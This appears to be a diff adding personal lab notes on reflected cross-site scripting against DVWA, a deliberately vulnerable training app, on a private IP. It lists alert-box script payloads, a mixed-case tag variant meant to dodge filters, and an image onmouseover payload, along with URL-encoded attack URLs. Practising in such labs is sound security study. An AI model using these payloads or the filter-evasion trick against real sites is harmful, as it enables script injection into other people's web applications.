@@ -1,0 +1,8 @@
+Reflected XSS
+<script>alert("test")</script>
+http://192.168.1.123/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E#
+
+<SCript>alert("test")</SCript>
+http://192.168.1.123/dvwa/vulnerabilities/xss_r/?name=%3CSCript%3Ealert%28%22test%22%29%3C%2FSCript%3E#
+
+<IMG SRC=# onmouseover="alert('xxs')">
